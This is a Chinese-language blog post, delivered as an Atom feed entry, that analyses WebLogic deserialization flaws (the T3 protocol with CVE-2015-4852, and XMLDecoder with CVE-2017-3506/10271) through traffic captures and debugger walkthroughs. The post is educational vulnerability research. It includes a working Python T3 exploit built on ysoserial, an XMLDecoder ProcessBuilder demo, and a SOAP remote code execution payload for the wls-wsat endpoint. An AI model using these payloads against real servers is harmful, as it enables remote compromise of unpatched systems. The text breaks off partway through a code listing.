<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ConsT27&#39;s Blog</title>
  
  
  <link href="http://const27.com/atom.xml" rel="self"/>
  
  <link href="http://const27.com/"/>
  <updated>2021-11-05T13:46:54.483Z</updated>
  <id>http://const27.com/</id>
  
  <author>
    <name>ConsT27</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>浅析weblogic 反序列化漏洞</title>
    <link href="http://const27.com/2021/11/05/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://const27.com/2021/11/05/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-11-05T13:45:25.111Z</published>
    <updated>2021-11-05T13:46:54.483Z</updated>
    
    <content type="html"><![CDATA[<p>先引用一下奇安信团队发出的weblogic历史漏洞图，可以发现以反序列化为主，反序列化问题主要来自XMLDecoder和T3协议</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/EkibxOB3fs4icZvMt447sQMic9fg5HZXT9GUxegpKfC0sDZFhNibfl1bbktWNsSZicNcJ3JLiaT5P9NtXm2hFhibwgmVQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><h2 id="T3协议"><a href="#T3协议" class="headerlink" title="T3协议"></a>T3协议</h2><p>weblogic t3协议就是weblogic的rmi所使用的协议。<br>在传统java中，rmi使用的是jrmp协议。</p><p>JRMP协议的通信由如下部分构成</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">客户端对象</span><br><span class="line">服务端对象</span><br><span class="line">客户端代理对象（stub）</span><br><span class="line">服务端代理对象（skeleton）</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152334.png" alt="QQ截图20210219152334"></p><p>而T3协议在JRMP协议上做出了改进，stub和skeleton都是动态生成的，将对象部署到RMI注册中心时weblogic会自动生成stub和skeleton。</p><p>Weblogic之所以开发T3协议，是因为他们需要可扩展，高效的协议来使用Java构建企业级的分布式对象系统</p><h3 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h3><p>我们想抓包分析T3协议有两个方法<br>1.写一个T3 rmi server和一个T3 rmi client，启动client去请求rmi server，从而实现抓包，这个方法的详细步骤在这篇文章中<a href="https://hu3sky.github.io/2020/03/20/weblogic%20t3%20%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8%E4%B8%8E%E9%98%B2%E5%BE%A1/#%E5%AE%9E%E7%8E%B0%E6%AD%A3%E5%B8%B8t3%E7%B1%BB%E7%9A%84%E8%B0%83%E7%94%A8">https://hu3sky.github.io/2020/03/20/weblogic%20t3%20%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8%E4%B8%8E%E9%98%B2%E5%BE%A1/#%E5%AE%9E%E7%8E%B0%E6%AD%A3%E5%B8%B8t3%E7%B1%BB%E7%9A%84%E8%B0%83%E7%94%A8</a></p><p>2.使用python模拟client发包，从而实现T3协议抓包分析。这个实现起来比较容易，我们就通过该方法来一窥T3协议的奥妙。<br><a href="https://xz.aliyun.com/t/10365#toc-1%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA%E5%9C%A8%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%E4%B8%AD%EF%BC%8C%E8%BF%99%E9%87%8C%E4%B8%8D%E5%86%8D%E8%B5%98%E8%BF%B0%E3%80%82">https://xz.aliyun.com/t/10365#toc-1环境的搭建在这篇文章中，这里不再赘述。</a></p><p>在完成环境搭建后，我们使用如下exp</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from os import popen</span><br><span class="line">import struct # 负责大小端的转换</span><br><span class="line">import subprocess</span><br><span class="line">from sys import stdout</span><br><span class="line">import socket</span><br><span class="line">import re</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">def generatePayload(gadget,cmd):</span><br><span class="line">    YSO_PATH &#x3D; &quot;E:\\tools\\java\\ysoserial-master-d367e379d9-1.jar&quot;</span><br><span class="line">    popen &#x3D; subprocess.Popen([&#39;java&#39;,&#39;-jar&#39;,YSO_PATH,gadget,cmd],stdout&#x3D;subprocess.PIPE)</span><br><span class="line">    return popen.stdout.read()</span><br><span class="line"></span><br><span class="line">def T3Exploit(ip,port,payload):</span><br><span class="line">    sock &#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((ip,port))</span><br><span class="line">    handshake &#x3D; &quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span><br><span class="line">    sock.sendall(handshake.encode())</span><br><span class="line">    data &#x3D; sock.recv(1024)</span><br><span class="line">    compile &#x3D; re.compile(&quot;HELO:(.*).0.false&quot;)</span><br><span class="line">    match &#x3D; compile.findall(data.decode())</span><br><span class="line">    if match:</span><br><span class="line">        print(&quot;Weblogic: &quot;+&quot;&quot;.join(match))</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;Not Weblogic&quot;)</span><br><span class="line">        #return</span><br><span class="line">    header &#x3D; binascii.a2b_hex(b&quot;00000000&quot;)</span><br><span class="line">    t3header &#x3D; binascii.a2b_hex(b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;)</span><br><span class="line">    desflag &#x3D; binascii.a2b_hex(b&quot;fe010000&quot;)</span><br><span class="line">    payload &#x3D; header + t3header  +desflag+  payload</span><br><span class="line">    payload &#x3D; struct.pack(&quot;&gt;I&quot;,len(payload)) + payload[4:]</span><br><span class="line">    sock.send(payload)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    ip &#x3D; &quot;127.0.0.1&quot;</span><br><span class="line">    port &#x3D; 7001</span><br><span class="line">    gadget &#x3D; &quot;CommonsCollections1&quot;</span><br><span class="line">    cmd &#x3D; &quot;touch &#x2F;tmp&#x2F;hack&quot;</span><br><span class="line">    payload &#x3D; generatePayload(gadget,cmd)</span><br><span class="line">    T3Exploit(ip,port,payload)</span><br></pre></td></tr></table></figure><p>指定端口和IP后，可以通过以下指令来看是否攻击成功</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec  weblogic1036jdk7u21 ls tmp&#x2F;</span><br></pre></td></tr></table></figure><p>我们通过抓取相关流量包来一窥T3协议，wireshark设置tcp.port==7001，执行以上脚本，抓取T3流量</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211031185642616.png" alt="image-20211031185642616"></p><p>发送的第一个包为T3协议头，t3后面接的使weblogic客户端版本</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211031185839574.png" alt="image-20211031185839574"></p><p>服务器会返回应答，并在HELO 后接weblogic服务端版本，利用这个特性可以刺探weblogic服务器版本</p><p><img src="C:\Users\14216\AppData\Roaming\Typora\typora-user-images\image-20211031190051255.png" alt="image-20211031190051255"></p><p>接下来客户端会发送一个相对比较大的数据包，其内容分析如下</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211031204848507.png" alt="image-20211031204848507"></p><p>数据包仅为蓝色部分的内容，第一个框中是数据包的长度，第二个框是反序列化标志，两个框中间是T3协议头，剩下的便是序列化数据。</p><p>T3协议发送序列化数据时有时候并不只发送一段序列化数据，它可能会发送多个序列化数据，彼此之间以反序列化标志隔开，就像这样</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211031210027329.png" alt="image-20211031210027329"></p><h3 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h3><p>漏洞版本</p><blockquote><p>10.3.6.0, 12.1.2.0, 12.1.3.0, and 12.2.1.0</p></blockquote><p>上面的exp就是哪来打这个洞的，上述CVE版本没有对T3反序列化安全问题做任何防范，利用T3协议反序列化CC链。jdk1.7，weblogic10.3.6.0 用cc链1，3，6都能打。</p><p>这个洞可以说是weblogic反序列化漏洞的源头了。</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p><strong>weblogic.rjvm.InboundMsgAbbrev#readObject</strong></p><p>作为入口的readObject方法就在此处，在此中调用了InboundMsgAbbrev.ServerChannelInputStream的readObject方法，var1即是序列化后的数据，我们进行一个跟进</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211031213830584.png" alt="image-20211031213830584"></p><p><strong>InboundMsgAbbrev.ServerChannelInputStream#readObject</strong></p><p>跟进后发现此类继承自ObjectInputStream且未重写readObject方法<br>也就是说序列化数据传入后直接以参数的形式传入了ObjectInputStream对象，并调用了其readObject方法。<br>于是便畅通无阻的触发了反序列化漏洞</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211031215946437.png" alt="image-20211031215946437"></p><h4 id="resolveClass"><a href="#resolveClass" class="headerlink" title="resolveClass"></a>resolveClass</h4><p>这里之所以要说一下resolveClass，是因为网上很多T3反序列化相关文章都提了这个东西，也是我之前不知道的一个东西，所以便记录一下。</p><p>resolveClass是ObjectInputStream.readObject()中必经的一个方法，也就是说在反序列化过程中，序列化的数据都会从resolveClass这个方法中经过一次。</p><p>这个方法的作用是类的序列化描述符加工成该类的Class对象，很多针对反序列化Gadget的拦截都是通过重写此方法完成的（如通过黑名单来禁止某类反序列化）</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211101162703325.png" alt="image-20211101162703325"></p><p>贴上一张廖师傅的博客的反序列化攻击时序图：<br>可以看到反序列化拦截位置除了resolveClass以外还有一个resolveProxyClass，它用于返回实现了代理类描述符中所有接口的代理类，这里不对该方法展开叙述，它也可以被用作反序列化攻击的拦截</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211101134646925.png" alt="image-20211101134646925"></p><p>上文在分析CVE-2015-4852时，InboundMsgAbbrev.ServerChannelInputStream类重写了resolveClass，如果重写得当那么就可以起到缓解反序列化漏洞的作用，可惜这个类直接调用了父类的resolveClass</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211101162325788.png" alt="image-20211101162325788"></p><h2 id="XMLDecoder"><a href="#XMLDecoder" class="headerlink" title="XMLDecoder"></a>XMLDecoder</h2><p>XMLDecoder是一套用于对XML进行序列化或反序列化的一套API，它在JDK1.4就已经被开发了出来，它对XML的解析模式并不是更为人所知的DOM解析，而是SAX解析。<br>DOM解析在解析XML时会读取所有数据然后生成DOM树来解析，而SAX则是线性读取XML，所以SAX解析XML性能消耗相对较小。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211102152704874.png" alt="image-20211102152704874"></p><h3 id="apache-xerces"><a href="#apache-xerces" class="headerlink" title="apache xerces"></a>apache xerces</h3><p>apache xerces是XMLDecoder解析XML时的一个重要组件。<br>apache xerces是一个用于解析XML中有哪些标签，语法是否合法的解析器，官方在JDK1.5便集成了此解析器并作为XML的默认解析器。</p><p>在XML序列化数据传达至XMLDecoder.readObject() 方法进行反序列化等操作后，便会传递给xerces进行解析，在xerces解析完毕后数据便会交给DocumentHandler完成后续的操作，如果是JDK1.6便会交给ObjectHandler进行处理。</p><h3 id="DocumentHandler"><a href="#DocumentHandler" class="headerlink" title="DocumentHandler"></a>DocumentHandler</h3><p>DocumentHandler（com.sun.beans.decoder.DocumentHandler）在XMLDecoder处理XML数据时起到事件处理器的作用，它在JDK1.7中被实现。<br>它会跟进传入的XML标签，属性等信息调用不同的Handler进行事件处理<br>我们针对XMLDecoder的反序列化攻击便是传入特定的XML序列化数据由DocumentHandler进行事件处理，进而实现RCE等攻击。</p><p>下图是jdk1.7 DocumentHandler中所定义的各种标签的处理办法。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211102154241440.png" alt="image-20211102154241440"></p><p>JDK1.6中也有个和DocumentHandler功能类似的ObjectHandler，但是它实现的标签远少于DocumentHandler，且远不如其规范化。下图是ObjectHandler的部分代码。</p><p>“值得注意的是CVE-2019-2725的补丁绕过其中有一个利用方式就是基于JDK1.6。”</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211102154904139.png" alt="image-20211102154904139"></p><p>下面举例一下各标签的作用</p><p><strong>string</strong></p><p>&lt;string&gt;aaa&lt;/string&gt;</p><p>的意思就是表示一段值为aaa的字符串，这个标签一般与其他标签一起用来达到一些效果</p><p><strong>object</strong></p><p>object标签表示一个对象，其class属性指定类名，method属性指定某方法名（构造方法方法名为new）</p><p>如 new A(“test”); 的xml文档表现为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;object class&#x3D;&quot;A&quot; method&#x3D;&quot;new&quot;&gt;</span><br><span class="line">&lt;string&gt;test&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;object&gt;</span><br></pre></td></tr></table></figure><p><strong>void</strong></p><p>void一般与其他标签搭配使用，它也有method，class等属性，于是它和object标签十分相像。</p><p>void一般用于函数调用并通过method属性指定方法名，以及其他辅助作用（如array标签中充当索引）</p><p>如A a = new A(); A.foo(“test”); 的xml文档表现为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;object class&#x3D;&quot;A&quot;&gt;</span><br><span class="line">    &lt;void method&#x3D;&quot;foo&quot;&gt;</span><br><span class="line">    &lt;string&gt;test&lt;&#x2F;string&gt;</span><br><span class="line">    &lt;&#x2F;void&gt;</span><br><span class="line">&lt;&#x2F;object&gt;</span><br></pre></td></tr></table></figure><p><strong>array</strong></p><p>array标签用于表示数组，class属性指定类名，内部通过void标签的index属性设置索引</p><p>如 String[] a = new String[];s[1]=”test” 的xml表现形式为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;array class&#x3D;&quot;java.lang.String&quot;&gt;</span><br><span class="line">    &lt;void index&#x3D;&quot;1&quot;&gt;</span><br><span class="line">    &lt;string&gt;test&lt;&#x2F;string&gt;</span><br><span class="line">  &lt;&#x2F;void&gt;</span><br><span class="line">&lt;&#x2F;array&gt;</span><br></pre></td></tr></table></figure><h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><p>不同的XML标签对应着不同的handler，也就对应着不同的处理机制。<br>大多数handler都有addAttribute方法，这个方法主要用于提取标签中的属性并进行处理；<br>以及getValueObject方法，这个方法主要用于获取标签的值。</p><p>首先以java标签为例：var1对应着属性名，var2对应着属性值。java标签会根据class属性中的值进行类加载。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211102162202707.png" alt="image-20211102162202707"></p><p>再来看看New标签：和java标签的handler类似，它也会进行类加载操作，不过NewElementHandler是许多handler的父类（如ArrayElementHandler，ObjectElementHandler），这就意味着NewElementHandler的子类也可以进行类加载</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211102162638378.png" alt="image-20211102162638378"></p><p>在上文中提到object标签有进行类加载的能力，是因为其class属性是由父类NewElementHandler进行处理的。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103141517211.png" alt="image-20211103141517211"></p><p>而void标签之所以和object标签如此相像的原因是，VoidElementHandler继承自ObjectElementHandler，且仅重写了一个isArgument方法，其它都和父类一样。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103141611207.png" alt="image-20211103141611207"></p><p>再来看看array，它也是一个很重要的标签</p><h3 id="Demo调试"><a href="#Demo调试" class="headerlink" title="Demo调试"></a>Demo调试</h3><p>从上文大概知道XMLDecoder处理xml的流程为 :XMLDecoder.readObject() -&gt;xerces解析-&gt;DocumentHandler事件处理，那不如写个Demo调试一下看看具体过程如何</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.beans.XMLDecoder;</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) throws FileNotFoundException &#123;</span><br><span class="line">         String s &#x3D; &quot;&lt;java version&#x3D;\&quot;1.7.0_80\&quot; class&#x3D;\&quot;java.beans.XMLDecoder\&quot;&gt;\n&quot; +</span><br><span class="line">                 &quot; &lt;object class&#x3D;\&quot;java.lang.ProcessBuilder\&quot;&gt;\n&quot; +</span><br><span class="line">                 &quot;  &lt;array class&#x3D;\&quot;java.lang.String\&quot; length&#x3D;\&quot;1\&quot;&gt;\n&quot; +</span><br><span class="line">                 &quot;    &lt;void index&#x3D;\&quot;0\&quot;&gt;&lt;string&gt;calc&lt;&#x2F;string&gt;&lt;&#x2F;void&gt;\n&quot; +</span><br><span class="line">                 &quot;  &lt;&#x2F;array&gt;\n&quot; +</span><br><span class="line">                 &quot;  &lt;void method&#x3D;\&quot;start\&quot;&gt;&lt;&#x2F;void&gt;\n&quot; +</span><br><span class="line">                 &quot; &lt;&#x2F;object&gt;\n&quot; +</span><br><span class="line">                 &quot;&lt;&#x2F;java&gt;&quot;;</span><br><span class="line">        StringBufferInputStream stringBufferInputStream &#x3D; new StringBufferInputStream(s);</span><br><span class="line">        XMLDecoder xmlDecoder &#x3D; new XMLDecoder(stringBufferInputStream);</span><br><span class="line">        Object o &#x3D; xmlDecoder.readObject();</span><br><span class="line">        System.out.println(o);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接开始动调，在demo中xmlDecoder.readObject() 处下断点。跟进。</p><h4 id="readObject"><a href="#readObject" class="headerlink" title="readObject"></a>readObject</h4><p>跟进readObject,可以发现调用了parsingComplete(),继续跟进</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103150406152.png" alt="image-20211103150406152"></p><p>java.beans.XMLDecoder#parsingComplete, 因为我们跟踪的是对XML的解析过程，所以这个parse方法就很可疑，而且又因为是可跟进的，所以我们对其进行一个跟进</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103190636095.png" alt="image-20211103190636095"></p><p>com.sun.beans.decoder.DocumentHandler#parse,又发现一个parse，跟进</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103191553843.png" alt="image-20211103191553843"></p><p>com.sun.org.apache.xerces.internal.jaxp. SAXParserImpl#parse,又找到一个parse，跟进</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103191733578.png" alt="image-20211103191733578"></p><p>com.sun.org.apache.xerces.internal.jaxp. SAXParserImpl#parse，发现跟进来的这个parse是重载方法，在其中又发现了parse，再跟</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103191905287.png" alt="image-20211103191905287"></p><p>com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser#parse,发现parse，又跟</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103192132155.png" alt="image-20211103192132155"></p><p>com.sun.org.apache.xerces.internal.parsers.XMLParser#parse</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103192259557.png" alt="image-20211103192259557"></p><p>com.sun.org.apache.xerces.internal.parsers. XML11Configuration#parse</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103192350388.png" alt="image-20211103192350388"></p><p>com.sun.org.apache.xerces.internal.parsers. XML11Configuration#parse,上一个parse的重载，其中调用了一个叫scanDocument的方法</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103195452940.png" alt="image-20211103195452940"></p><p>跟进scanDocument，到这里就已经进入了xerces解析了。这里有个do..while循环，作用是提取XML标签</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211104135729090.png" alt="image-20211104135729090"></p><p>调用链:</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211104140128888.png" alt="image-20211104140128888"></p><h4 id="ScanDocument"><a href="#ScanDocument" class="headerlink" title="ScanDocument"></a>ScanDocument</h4><p>我们来看一下scanDocument这个方法。    这里循环执行了next()方法，在前十几个循环里，这个方法对XML进行了解析和事件处理。大致的处理流程是对每一个解析到的标签先实例化对应的handler，然后循环调用addAttribute方法获取其所有属性并进行一定的事件处理，当解析到某个标签的结束标签时(如&lt;/java&gt;) 便会调用getValueObject 获取标签中的值的信息。这里借用一个图</p><p><img src="https://image.3001.net/images/20200820/1597902334.png!small" alt="img"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  public boolean scanDocument(boolean complete) throws IOException, XNIException &#123;</span><br><span class="line">      this.fEntityManager.setEntityHandler(this);</span><br><span class="line">      int event &#x3D; this.next();</span><br><span class="line">      </span><br><span class="line">do &#123;</span><br><span class="line">          switch(event) &#123;</span><br><span class="line">          case 1:</span><br><span class="line">          case 2:</span><br><span class="line">          case 6:</span><br><span class="line">..................</span><br><span class="line"> case 12:</span><br><span class="line">              this.fDocumentHandler.startCDATA((Augmentations)null);</span><br><span class="line">              this.fDocumentHandler.characters(this.getCharacterData(), (Augmentations)null);</span><br><span class="line">              this.fDocumentHandler.endCDATA((Augmentations)null);</span><br><span class="line"></span><br><span class="line">          event &#x3D; this.next();</span><br></pre></td></tr></table></figure><p>下面的调试我对XML中所涉及的所有handler的所有方法均下了断点以方便调试。</p><p>我们XML中第一个标签是JAVA，于是我们在JavaElementHandler各方法下断点后，可以发现next方法内部会先实例化JavaElementHandler，然后调用addAttribute，将获取的类对象(java.beans.XMLDecoder)置入this。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211104193157735.png" alt="image-20211104193157735"></p><p>然后自然是解析object标签，由于ObjectElementHandler未定义对class属性的解析，所以会调用父类NewElementHandler对其进行解析，将获取的类对象(java.lang.ProcessBuilder)置入this</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211104193433518.png" alt="image-20211104193433518"></p><p>就这样 得到标签-&gt;实例化Handler-&gt;循环标签属性进行事件处理  ，直到解析到第一个末标签(EndElement)&lt;/string&gt;,便会执行StringElementHandler#getValueObject，返回被ValueObjectImpl.create处理过的标签内的值。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211104203042115.png" alt="image-20211104203042115"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211104203356887.png" alt="image-20211104203356887"></p><p>然后接下来会把这个ValueObjectImpl对象赋值到父标签对应的handler的属性里</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211104211811441.png" alt="image-20211104211811441"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105025432694.png" alt="image-20211105025432694"></p><p>而解析到&lt;void index=&quot;0&quot;&gt;&lt;string&gt;calc&lt;/string&gt;&lt;/void&gt; 的&lt;/void&gt; 时，会根据if逻辑判断这里void标签的作用，这里判断的void起到一个数组元素赋值的作用，于是便通过set方法往Array赋值。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105134901622.png" alt="image-20211105134901622"></p><p>在解析到&lt;void method=&quot;start&quot;&gt;&lt;/void&gt;的末标签&lt;/void&gt;时，它的逻辑是这样的，先获取父handler对应type的实例化对象，然后再对其使用start方法</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105140017348.png" alt="image-20211105140017348"></p><p>如果我们跟进这个getContextBean就会来到这里，发现确实是调用链父handler即ObjectElementHandler的getValueObject</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105140036168.png" alt="image-20211105140036168"></p><p>跟进看看父handler的getValueObject逻辑，发现确实是返回了一个new ProcessBuilder(“calc”).  calc字段在var5.argument中，截图中没有截出来。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105140436181.png" alt="image-20211105140436181"></p><p>回到本handler，通过拼接，执行了new ProcessBuilder(“calc”).start(); 弹出计算器。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105140826489.png" alt="image-20211105140826489"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>当xml数据传入到XMLDecoder.readObejct后经过一些处理会传入到scanDocument方法里，这个方法会循环解析XML标签并交由相应的Handler进行处理，且子标签的handler对父标签的handler由链表结构串联起来，所以每解析一个标签就会往这个链表结构增添新元素并进行一些事件处理。</p><p>从安全方面而言，便是攻击者通过传入恶意XML数据交由XMLDecoder进行解析，XMLDecoder会循环遍历XML数据并进行拼接处理，直到最后拼接出完整的恶意语句并执行。</p><h3 id="CVE-2017-3506-amp-CVE-2017-10271"><a href="#CVE-2017-3506-amp-CVE-2017-10271" class="headerlink" title="CVE-2017-3506&amp;CVE-2017-10271"></a>CVE-2017-3506&amp;CVE-2017-10271</h3><p>影响范围</p><ul><li>WebLogic 10.3.6.0</li><li>WebLogic 12.1.3.0</li><li>WebLogic 12.2.1.0</li><li>WebLogic 12.2.1.1</li><li>WebLogic 12.2.1.2</li></ul><p>该漏洞利用weblogic的wls-wsat组件对XML用XMLDecoder进行解析的功能，从而对其传入恶意XML数据造成反序列化攻击。</p><p>复现分析如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[*] wls-wsat组件路径：</span><br><span class="line"></span><br><span class="line">            &#x2F;wls-wsat&#x2F;CoordinatorPortType</span><br><span class="line">            &#x2F;wls-wsat&#x2F;CoordinatorPortType11</span><br><span class="line">            &#x2F;wls-wsat&#x2F;ParticipantPortType</span><br><span class="line">            &#x2F;wls-wsat&#x2F;ParticipantPortType11</span><br><span class="line">            &#x2F;wls-wsat&#x2F;RegistrationPortTypeRPC</span><br><span class="line">            &#x2F;wls-wsat&#x2F;RegistrationPortTypeRPC11</span><br><span class="line">            &#x2F;wls-wsat&#x2F;RegistrationRequesterPortType</span><br><span class="line">            &#x2F;wls-wsat&#x2F;RegistrationRequesterPortType1</span><br></pre></td></tr></table></figure><p>对weblogic路由   <a href="http://xxx:7001/wls-wsat/CoordinatorPortType">http://xxx:7001/wls-wsat/CoordinatorPortType</a> 发送如下数据包</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt;</span><br><span class="line">  &lt;soapenv:Header&gt;</span><br><span class="line">    &lt;work:WorkContext xmlns:work&#x3D;&quot;http:&#x2F;&#x2F;bea.com&#x2F;2004&#x2F;06&#x2F;soap&#x2F;workarea&#x2F;&quot;&gt;</span><br><span class="line">        &lt;java version&#x3D;&quot;1.8.0_131&quot; class&#x3D;&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">          &lt;void class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">            &lt;array class&#x3D;&quot;java.lang.String&quot; length&#x3D;&quot;3&quot;&gt;</span><br><span class="line">              &lt;void index&#x3D;&quot;0&quot;&gt;</span><br><span class="line">                &lt;string&gt;&#x2F;bin&#x2F;bash&lt;&#x2F;string&gt;</span><br><span class="line">              &lt;&#x2F;void&gt;</span><br><span class="line">              &lt;void index&#x3D;&quot;1&quot;&gt;</span><br><span class="line">                &lt;string&gt;-c&lt;&#x2F;string&gt;</span><br><span class="line">              &lt;&#x2F;void&gt;</span><br><span class="line">              &lt;void index&#x3D;&quot;2&quot;&gt;</span><br><span class="line">                &lt;string&gt;touch &#x2F;tmp&#x2F;1234&lt;&#x2F;string&gt;</span><br><span class="line">              &lt;&#x2F;void&gt;</span><br><span class="line">            &lt;&#x2F;array&gt;</span><br><span class="line">          &lt;void method&#x3D;&quot;start&quot;&#x2F;&gt;&lt;&#x2F;void&gt;</span><br><span class="line">        &lt;&#x2F;java&gt;</span><br><span class="line">      &lt;&#x2F;work:WorkContext&gt;</span><br><span class="line">    &lt;&#x2F;soapenv:Header&gt;</span><br><span class="line">  &lt;soapenv:Body&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure><p>并修改content-type</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105162455106.png" alt="image-20211105162455106"></p><p>我这里直接在javaElementHandler#addAttribute 下断点然后观察堆栈信息<br>可以发现是WorkContextXmlInputAdapter#readUTF 处调用了xmlDecoder的readObject方法。我们的XML就这样传进去畅通无阻的进入了XMLDecoder的解析。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105153940400.png" alt="image-20211105153940400"></p><p>攻击结果</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105154839248.png" alt="image-20211105154839248"></p><p><code>CVE-2017-3506</code>修补方案为采用黑名单机制禁用了object标签，这简直不要太好绕，所以CVE-2017-10271来了。</p><p>这是黑名单校验的相关代码。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private void validate(InputStream is) &#123;</span><br><span class="line">      WebLogicSAXParserFactory factory &#x3D; new WebLogicSAXParserFactory();</span><br><span class="line">      try &#123;</span><br><span class="line">         SAXParser parser &#x3D; factory.newSAXParser();</span><br><span class="line">         parser.parse(is, new DefaultHandler() &#123;</span><br><span class="line">            public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException &#123;</span><br><span class="line">               if(qName.equalsIgnoreCase(&quot;object&quot;)) &#123;</span><br><span class="line">                  throw new IllegalStateException(&quot;Invalid context type: object&quot;);</span><br><span class="line">               